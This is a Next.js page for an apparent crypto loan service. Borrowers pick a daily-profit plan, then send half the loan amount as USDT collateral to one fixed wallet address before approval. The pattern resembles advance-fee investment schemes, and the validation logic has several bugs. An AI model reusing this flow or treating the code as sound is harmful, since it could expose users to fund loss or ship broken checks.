"use client"

import QRCode from "qrcode";
import { ErrorMessage, Field, Form, Formik } from 'formik';
import Image from 'next/image'
import React, { useState, useEffect } from 'react'
import * as Yup from "yup";
import { useRouter } from 'next/navigation';
import axios from 'axios';
import { CgArrowLeft } from 'react-icons/cg';
import { DesktopSideBar } from './../components/DesktopSideBar';
import { Header } from './../components/Header';
import { useAuth } from '@/app/context/AuthContext';
import { BiCopy } from "react-icons/bi";
import { GrTransaction } from "react-icons/gr";
import { LuArrowDownToLine } from "react-icons/lu";
import { FaInfo } from "react-icons/fa6";
import { Footer } from "../components/Footer";
import { TbTriangleInvertedFilled } from "react-icons/tb";
import { IoIosInformationCircleOutline } from "react-icons/io";
import LoadingScreen from "./loading";

const plans = [
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_C_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_C_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_C_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_C_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_C_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_C_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_D_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_D_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_D_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_D_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_D_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_D_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_E_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_E_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_E_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_E_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_E_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_E_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_F_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_F_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_F_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_F_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_F_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_F_REFERRAL_BONUS,

    }
]


export default function Page() {

  const router = useRouter();
  const [step, setStep] = useState(1);
  const [coin, setCoin] = useState("USDT");
  const { user } = useAuth();
  const [amount, setAmount] = useState(0);
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [collateral, setCollateral] = useState(5000);
  const loanMax = 1000000;
  const loanMin = 5000;
  const [errorMessage, setErrorMessage] = useState("");
  const walletAddress = process.env.NEXT_PUBLIC_TETHER_USDT;
  
    const [qr, setQr] = useState("");
  
    useEffect(() => {
      QRCode.toDataURL(walletAddress)
        .then(url => setQr(url))
        .catch(err => console.error(err));
    }, []);
  
    // ✅ Copy Address
    const copyAddress = () => {
        // Get the text field
    let copyText = document.getElementById("address");

    // Select the text field
    copyText.select();
    copyText.setSelectionRange(0, 99999); // For mobile devices

    // Copy the text inside the text field
    navigator.clipboard.writeText(walletAddress);
      alert("Wallet address copied ✅");
    };
  
    // ✅ Download QR
    const downloadQR = () => {
      const link = document.createElement("a");
      link.href = qr;
      link.download = "wallet-qr.png";
      link.click();
    };


  const handlePlan = (coin) => {
    setCoin(coin);
    setStep(2);
  }

  let initialValueAmount = {
    amount: 5000,
    collateral: 2500
  }

  const validationSchemaAmount = Yup.object({
    amount: Yup.number()
      .required("Please enter the amount you want to borrow."),
  });

  let initialValueTransactionID = {
    transactionID: "",
  }

  const validationSchemaTransactionID = Yup.object({
    transactionID: Yup.string()
      .required("Please enter you transaction ID."),
  });


  async function processPayment (values, onSubmitProps) {
        setIsError(false)
        setLoading(true);

        try {

      const res = await axios.post(
        `/api/auth/users/loans/loan?id=${user._id}`,
        {
          transactionID: values.transactionID,
          currency: coin,
          plan: selectedPlan,
          amount: amount,
        },
        {
          withCredentials: true,
          headers: { "Content-Type": "application/json" }  
        }
      );

      if (res.status === 201) {
        setIsError(false);
        setStep(4);
      }
      
    } catch(err) {
      setErrorMessage(err.message);
      setIsError(true);
      setLoading(false);
    }
  }

  async function borrowAmount (values, onSubmitProps) {
    const convertedAmount = Number(values.amount) / 2;
    setIsError(false)
      setLoading(true);

      if (selectedPlan == {} || values.amount < selectedPlan.plan_min) {
            setErrorMessage("Amount must not be less than selected plan minimum amount!");
            setIsError(true)
            setLoading(false);
        } else if (selectedPlan == {} || values.amount > selectedPlan.plan_max) {
            setErrorMessage("Amount must not be above selected plan maximum amount!");
            setIsError(true)
            setLoading(false);
        } else if (selectedPlan.plan_max === "UNLIMITED" &&  values.amount >= selectedPlan.plan_max) {
            setErrorMessage("Amount must not be above selected plan maximum amount!");
            setIsError(true)
            setLoading(false);
        }
         else {
            setIsError(false)
            setAmount(convertedAmount)
            setStep(3);
            setLoading(false);
        }
  }

  return (
    <div className="bg-white w-full h-full dark:bg-isoDark dark:text-white text-black min-h-screen relative font-[family-name:var(--font-geist-sans)]">
     {loading === true && (<LoadingScreen />)}
     <div className='hidden md:block w-full'>
        <Header />
     </div>

       <div className='w-full h-full min-h-screen md:pt-20 flex items-start'>
     
          <DesktopSideBar tab={"deposit"} />

          <div className='w-full h-full md:py-16 bg-none text-black relative px-4 flex flex-col md:justify-center md:items-center container mx-auto md:px-40'>
                <div className='w-full flex flex-col space-y-5 md:space-y-16 '>

                <div className='flex items-center py-5 md:py-0 justify-center text-black dark:text-white relative'>
                    {
                        step === 1 ? (
                            <a
                                className='flex absolute left-0'
                                href='/dashboard'
                            >
                                <CgArrowLeft className='text-2xl' />
                            </a>
                        ) : step === 2 ? (
                            <a
                                className='flex absolute left-0'
                                href='#'
                                onClick={() => setStep(5)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </a>
                        ) : (
                            <div
                                className='flex absolute left-0'
                                onClick={() => setStep(1)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </div>
                        )
                    }

                    <h1 className='text-lg font-medium md:text-3xl md:font-semibold'>

                    {step === 1 ? (
                        <span></span>
                    ) : step === 2 ? (
                        <span>Flexible Rate Loan</span>
                    ) : step === 5 ? (
                        <span>Choose Plan</span>
                    ) : (
                        <span>Deposit {" "}{coin}</span>
                    )}
                
                    </h1>
                </div>


                {step === 1 && (
                    <div className="w-full flex dark:text-white text-black space-y-3 flex-col">
                        <div className="w-full flex justify-center items-center">
                            <h4
                            className={`text-2xl font-semibold py-5 px-4`}
                            >
                            Astiox Loans
                            </h4>
                        </div>

                        <div className="flex flex-col space-y-2 rounded-2xl p-4 bg-gradient-to-b from-blue-50 to-white border dark:bg-gradient-to-b dark:from-isoDark2 dark:to-isoDark2 dark:border-neutral-600 border-blue-200">
                            <h3 className="text-sm font-medium">Flexible Rate Loan</h3>
                            <p className="text-neutral-400 text-xs">Repay at any time & no transaction fee</p>
                            <button
                             onClick={() => setStep(5)}
                                className="w-full py-3 dark:bg-isoColor2 dark:text-black rounded-lg bg-isoColor1 text-sm text-white"
                            >
                                Start Borrowing
                            </button>
                        </div>

                        

                        <div className="w-full flex flex-col space-y-6 mb-14 py-5 transition-500 overflow-hidden">
                            <div className="w-full flex justify-center items-center">
                                <h4
                                className={`text-Black text-xl font-semibold py-5 px-4`}
                                >
                                    Popular Assets
                                </h4>
                            </div>

                            <div className='flex w-full text-xs text-neutral-500 justify-between items-center'>
                                <p className='flex items-center px-4 space-x-2'>
                                    Coin
                                </p>

                                <p className='space-y-1'>
                                    Annualized Rate
                                </p>
                            </div>

                            <div className='flex w-full justify-between items-center'>
                                <div className='flex items-center space-x-2 px-4'>
                                    <Image
                                        src="/icons/Tether.webp"
                                        alt="Astiox_logo"
                                        className="w-7"
                                        width={50}
                                        height={0}
                                    />
                                    <div className='space-y-1'>
                                        <h2 className='font-medium text-base'>USDT</h2>
                                    </div>
                                </div>

                                <div className='space-y-1'>
                                        <h2 className='font-medium text-sm'>3.81%</h2>
                                </div>
                            </div>
                        
                            <div className='flex w-full justify-between items-center'>
                                <div className='flex items-center px-4 space-x-2'>
                                    <Image
                                        src="/icons/bitcoin.webp"
                                        alt="Astiox_logo"
                                        className="w-7"
                                        width={50}
                                        height={0}
                                    />
                                    <div className='space-y-1'>
                                        <h2 className='font-medium text-base'>BTC</h2>
                                    </div>
                                </div>

                                <div className='space-y-1'>
                                        <h2 className='font-medium text-sm'>0.53%</h2>
                                </div>
                            </div>

                            <div className='flex w-full justify-between items-center'>
                                <div className='flex items-center space-x-2 px-4'>
                                    <Image
                                        src="/icons/ethereum.webp"
                                        alt="Astiox_logo"
                                        className="w-7"
                                        width={50}
                                        height={0}
                                    />
                                    <div className='space-y-1'>
                                        <h2 className='font-medium text-base'>ETH</h2>
                                    </div>
                                </div>

                                <div className='space-y-1'>
                                        <h2 className='font-medium text-sm'>2.42%</h2>
                                </div>
                            </div>
                        </div>

                        
                    </div>
                )}

                {step === 3 && (
                    <div className="flex flex-col dark:space-y-5 items-center w-full pb-40 md:px-40 justify-center">
                    
                                            <div className='w-full rounded-3xl dark:bg-isoDark2 dark:text-white dark:border dark:border-neutral-600 bg-[#f4f4f5] text-black p-3 flex space-x-3 items-center'>
                                                <div className='bg-isoColor1 dark:bg-isoColor2 dark:text-black rounded-full p-1 text-blue-100'><FaInfo className={`h-4 w-4`} /></div>
                                                <p className='text-xs'>Before sending, double-check <span className="text-isoColor1 dark:text-isoColor2">the network</span>, <span className="text-isoColor1 dark:text-isoColor2">deposit address</span>, and <span className="text-isoColor1 dark:text-isoColor2">coin</span>, and send only <span className="text-isoColor1 dark:text-isoColor2">the exact amount</span>.</p>
                                            </div>
                    
                                            <div className='w-full flex flex-col md:px-5 relative md:w-[450px] md:h-[650px] md:rounded-3xl md:shadow-lg'>
                                                
                                                <div className="">
                                                    <div className="flex justify-center items-center">
                    
                                                        {/* QR Code */}
                                                        <div className="flex justify-center items-center">
                                                        {qr && (
                                                            <div className="p-3 bg-white relative rounded-2xl">
                                                            <img
                                                                src={qr}
                                                                onClick={downloadQR}
                                                                alt="Wallet QR"
                                                                className="w-44 h-44"
                                                            />
                    
                                                            <div className='absolute bg-white p-1 top-20 right-20 '>
                                                                    {coin === "BTC" ? (
                                                                    <Image
                                                                        src="/icons/bitcoin.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                    />)
                                                                    : coin === "ETH" ? (
                                                                        <Image
                                                                        src="/icons/ethereum.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                    />
                                                                    )
                                                                    : coin === "USDT" ? (
                                                                        <Image
                                                                        src="/icons/Tether.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                    )
                                                                    : coin === "BNB" ? (
                                                                        <Image
                                                                        src="/icons/bnb-icon2_2x.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                    )
                                                                    : coin === "XRP" ? (
                                                                        <Image
                                                                        src="/icons/xrp-symbol-white-128.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                        )
                                                                    : coin === "SOL" ? (
                                                                        <Image
                                                                        src="/icons/solana.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                        )
                                                                    : (
                                                                        <Image
                                                                        src="/icons/Tether.webp"
                                                                        alt="Astiox_logo"
                                                                        className="w-7"
                                                                        width={50}
                                                                        height={0}
                                                                        />
                                                                        )}
                                                            </div>
                    
                                                            </div>
                                                        )}
                                                        </div>
                    
                                                    </div>
                                                </div>
                    
                                                <div className="flex w-full justify-between relative items-center">
                                                    <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                                        <p className="text-sm text-neutral-500">Network</p>
                    
                                                        <h1 className='text-lg dark:text-white font-semibold'>
                                                                        {coin === "BTC" ? "BTC"
                                                                        : coin === "ETH" ? "ETH"
                                                                        : coin === "USDT" ? "BSC"
                                                                        : coin === "BNB" ? "BSC"
                                                                        : coin === "XRP" ? "XRP"
                                                                        : coin === "SOL" ? "SOL"
                                                                        : "TRX"}
                                                        </h1>
                                                        <span className="text-xs text-neutral-400">
                                                                        {coin === "BTC" ? "Bitcoin (BTC)"
                                                                            : coin === "ETH" ? "Ethereum (ETH)"
                                                                            : coin === "USDT" ? "Tether USD (BEP20)"
                                                                            : coin === "BNB" ? "BNB Smart Chain (BNB)"
                                                                            : coin === "XRP" ? "BNB pegged XRP Token (BEP20)"
                                                                            : coin === "SOL" ? "Solana (SOL)"
                                                                            : ""}
                                                        </span>
                                                    </div>
                                                </div>
                    
                                                <div className="flex w-full justify-between relative items-center">
                                                    <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                                        <p className="text-sm text-neutral-500">Amount</p>
                                                        <h1 className="text-lg dark:text-white font-semibold">${amount} {coin}</h1>
                                                    </div>
                    
                                                    <div className="flex absolute right-0 pl-6">
                                                        <span onClick={() => setStep(2)} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                                            <GrTransaction className='w-5 h-5' />
                                                        </span>
                                                    </div>
                                                </div>
                    
                                                <div className="flex w-full justify-between relative items-center">
                                                    <div className="space-y-0 flex flex-col flex-wrap py-6 border-b dark:border-neutral-600 border-gray-100">
                                                        <p className="text-sm text-neutral-500">Deposit Address</p>
                                                        <input
                                                        id="address"
                                                        className="text-lg py-1 dark:bg-isoDark2 dark:text-white font-normal text-black w-full flex flex-wrap hover:outline-none px-0 border-0 outline-none"
                                                        type="text"
                                                        value={walletAddress}
                                                        readOnly
                                                        />
                                                    </div>
                    
                                                    <div className="flex absolute right-0 pl-6">
                                                        <span onClick={copyAddress} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                                            <BiCopy className='w-5 h-5' />
                                                        </span>
                                                    </div>
                                                </div>
                    
                                                <div className="flex flex-col space-y-4 py-4 text-xs">
                                                    <p className="flex justify-between items-center">
                                                        <span className="text-neutral-400">Minimum deposit</span>
                                                        <span className="dark:text-white">{'> '}{selectedPlan.plan_min}.00 USD</span>
                                                    </p>
                    
                                                    <p className="flex justify-between items-center">
                                                        <span className="text-neutral-400">Credited (Trading enabled)</span>
                                                        <span className="dark:text-white">1 Confirmation(s)</span>
                                                    </p>
                    
                                                    <p className="flex justify-between items-center">
                                                        <span className="text-neutral-400">Unlocked (Withdrawal enabled)</span>
                                                        <span className="dark:text-white">1 Confirmation(s)</span>
                                                    </p>
                                                </div>
                    
                                                <div className='fixed md:absolute bottom-0 bg-white dark:bg-isoDark dark:text-white py-4 left-4 right-4'>
                                                    <Formik
                                                                initialValues={initialValueTransactionID}
                                                                validationSchema={validationSchemaTransactionID}
                                                                onSubmit={processPayment}
                                                            >
                                                                {({ errors, touched, values }) => (
                                                                <Form className="w-full flex md:px-8 flex-col space-y-4">
                                                                    <div>
                                                                    <label
                                                                        htmlFor="transactionID"
                                                                        className="flex space-x-2 items-center text-sm pb-1"
                                                                    >Transaction ID:</label>
                                                                    <Field name="transactionID">
                                                                        {(props) => {
                                                                        const { field, form, meta } = props;
                                                                        return (
                                                                            <input
                                                                            placeholder=""
                                                                            className={`form__input dark:md:bg-isoDark dark:focus:border-isoColor2 dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 border-neutral-200 border text-neutral-400 font-medium rounded-full w-full p-3 text-md focus:outline-none focus:border-isoColor1 focus:text-black`}
                                                                            type="text"
                                                                            id="transactionID"
                                                                            name="transactionID"
                                                                            {...field}
                                                                            />
                                                                        );
                                                                        }}
                                                                    </Field>
                                                                    <ErrorMessage name="transactionID">
                                                                        {(errMsg) => (
                                                                        <span className="text-red-500 text-xs">{errMsg}</span>
                                                                        )}
                                                                    </ErrorMessage>
                                                                    </div>
                                                                    {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}
                    
                                                                    <button
                                                                    type="submit"
                                                                    className="w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                                    disabled={Formik.isValid || Formik.isSubmitting}
                                                                    >
                                                                    {loading ? "Processing..." : "Save and Process Payment"}
                                                                    </button>
                                                                </Form>
                                                                )}
                                                    </Formik>
                                                </div>
                    
                                            </div>
                    
                                        </div>
                )}

                {step === 2 && (
                    <div className='w-full h-full flex text-black dark:text-white relative py-5 flex-col'>
                    
                        <Formik
                            initialValues={initialValueAmount}
                            validationSchema={validationSchemaAmount}
                            onSubmit={borrowAmount}
                        >
                            {({ errors, touched, values }) => (
                            <Form className="w-full h-full flex md:px-8 flex-col space-y-4">
                                <div className='flex w-full justify-between border p-2 rounded-lg dark:border-neutral-600 border-neutral-200 items-center'>
                                    <div className='flex items-center space-x-2'>
                                        <Image
                                            src="/icons/Tether.webp"
                                            alt="Astiox_logo"
                                            className="w-6"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <span className='text-xs text-neutral-500'>Annualized Interest Rate</span>
                                        </div>
                                    </div>

                                    <div className='space-y-1'>
                                            <h2 className='font-medium text-green-600 text-sm'>4.81%</h2>
                                    </div>
                                </div>

                                <div>
                                    <label
                                        htmlFor="amount"
                                        className="flex space-x-2 items-center text-sm pb-1 md:text-black text-neutral-500 font-medium"
                                    >I want to borrow</label>
                                    
                                    <div className='w-full flex relative justify-between items-center'>
                                        <Field name="amount">
                                        {(props) => {
                                            const { field, form, meta } = props;
                                            return (
                                            <input
                                                placeholder="Please enter amount"
                                                className={`text-neutral-400 dark:bg-isoDark2 dark:text-white bg-gray-100 font-medium border-none rounded-xl w-full p-3 text-md focus:outline-none focus:none focus:text-black`}
                                                type="number"
                                                id="amount"
                                                name="amount"
                                                {...field}
                                            />
                                            );
                                        }}
                                        </Field>

                                        <span onClick={() => setStep(1)} className='text-black dark:text-neutral-400 flex w-fit items-center space-x-1.5 absolute right-3 font-medium'>
                                            <span>USD</span>
                                        </span>
                                    </div>

                                    <ErrorMessage name="amount">
                                        {(errMsg) => (
                                        <span className="text-red-500 text-xs">{errMsg}</span>
                                        )}
                                    </ErrorMessage>
                                        {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}
                                    
                                </div>

                                <div>
                                    <label
                                        htmlFor="collateral"
                                        className="flex space-x-2 items-center text-sm pb-1 md:text-black text-neutral-500 font-medium"
                                    >Collateral Amount</label>
                                    
                                    <div className='w-full flex relative justify-between items-center'>
                                       <input
                                                placeholder="Please enter collateral"
                                                className={`text-neutral-400 dark:bg-isoDark2 dark:text-white bg-gray-100 font-medium border-none rounded-xl w-full p-3 text-md focus:outline-none focus:none focus:text-black`}
                                                type="number"
                                                id="collateral"
                                                name="collateral"
                                                value={
                                                    values.amount ? Number(values.amount) / 2 : ""
                                                }
                                                readOnly
                                            />

                                        <span className='text-black dark:text-neutral-400 flex w-fit items-center space-x-1.5 absolute right-3 font-medium'>
                                            <div className='flex items-center'>
                                                <Image
                                                    src="/icons/Tether.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={5}
                                                    height={0}
                                                    />
                                            </div>
                                            <span>USDT</span>
                                        </span>
                                    </div>
                                    
                                </div>

                                <div className='w-full rounded-3xl bg-blue-50 dark:bg-isoDark2 dark:text-white text-black p-3 flex space-x-1 items-start'>
                                    <div className=' rounded-full p-1 dark:text-isoColor2 text-black'><IoIosInformationCircleOutline className={`h-4 w-4`} /></div>
                                    <p className='text-xs'>Astiox loans are sent to your main account balance when the application is approved.</p>
                                </div>

                                <div className='w-full rounded-3xl bg-blue-50 dark:bg-isoDark2 dark:text-white text-black p-3 flex space-x-1 items-start'>
                                    <div className=' rounded-full p-1 dark:text-isoColor2 text-black'><IoIosInformationCircleOutline className={`h-4 w-4`} /></div>
                                    <p className='text-xs'>For a successful approval of your loan application, we recommend you to complete your KYC verification.</p>
                                </div>

                                <div className="w-full flex py-3 space-x-4">
                                <label
                                    htmlFor="policy"
                                    className="flex space-x-2 justify-start items-baseline"
                                >
                                    <Field
                                    className={`form__input border border-neutral-200 rounded-sm bg-transparent dark:text-isoColor2 text-black text-2xl focus:outline-none`}
                                    type="checkbox"
                                    id="policy"
                                    value="policy"
                                    checked
                                    name="policy"
                                    />
                                    <span className='text-sm '>By continuing, you have read and agree to <a href='privacy' className="text-isoColor1 dark:text-isoColor2 font-medium">Astiox Loan Agreement</a> and <a href='privacy' className="text-isoColor1 dark:text-isoColor2 font-medium">Simple Earn Agreement.</a></span>
                                </label>
                                </div>

                                <div className=''>
                                    <button
                                        type="submit"
                                        className="w-full dark:text-black dark:bg-isoColor2 py-4 rounded-2xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                        >
                                        Confirm
                                    </button>
                                </div>

                            </Form>
                            )}
                        </Formik>

                    </div>
                )}

                {step === 4 && (
                                    <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 container mx-auto justify-center bg-black/50 items-center loading-modal">
                                                <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 bg-white dark:bg-isoDark2 dark:text-white space-y-4">
                                                  <div className='flex justify-center items-center w-full'><LuArrowDownToLine className='w-16 dark:text-isoColor2 text-isoColor1 h-16' /></div>
                                    
                                                  <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>Deposit Request was Successful!</h1>
                                    
                                                  <p className='text-xs text-center'>
                                                    The Loan application request you made has been successful sent. {process.env.NEXT_PUBLIC_COMPANY_NAME} is processing your transaction and you'll be notified went the verification is completed. Thank you.
                                                  </p>
                                
                                                  <a
                                                    href="/dashboard/loans"
                                                    className="w-full py-3 text-center rounded-xl dark:bg-isoColor2 dark:text-black bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                  >
                                                          OK
                                                  </a>
                                                </div>
                                    </div>
                )}

                {step === 5 && (
                                    <div className='w-full h-screen flex text-black dark:text-white relative flex-col'>
                                    
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-y-4 md:gap-8">
                                            
                                           {plans.map((plan) => (
                                                <div 
                                                key={plan.plan_name} 
                                                onClick={() => {
                                                    setSelectedPlan(plan);
                                                    setStep(2);
                                                }} 
                                                className={`flex cursor-pointer transition-all duration-500 border dark:border-neutral-600 border-neutral-300 rounded-2xl py-4 px-2 w-full flex-col space-y-3 ${
                                                    selectedPlan === plan
                                                        ? 'bg-isoColor1 border-isoColor1 dark:bg-isoColor2'
                                                        : ''
                                                    }`}>
                                                    <div className={`flex items-center space-x-1 ${selectedPlan === plan
                                                        ? 'text-white dark:text-black'
                                                        : 'text-black dark:text-white'
                                                    }`}>
                                                        <h1 className='flex font-medium text-2xl'>%{plan.plan_profit}.00</h1>
                                                        <span>{plan.plan_name}</span>
                                                    </div>
                                                    <div className={`text-xs space-y-1 text-neutral-300 ${selectedPlan === plan
                                                        ? 'dark:text-black'
                                                        : ''
                                                    }`}>
                                                        <p>Min. deposit: ${plan.plan_min}</p>
                                                        <p>Max. deposit: ${plan.plan_max}</p>
                                                        <p>Est. earning duration: {plan.plan_duration} hrs</p>
                                                    </div>
                                                </div>
                                             ))}
                
                                        </div>
                
                                    </div>
                )}

                </div>

          </div>

        </div>

       {step === 1 && ( <Footer tab={`loans`} />)}
    </div>
  )
}
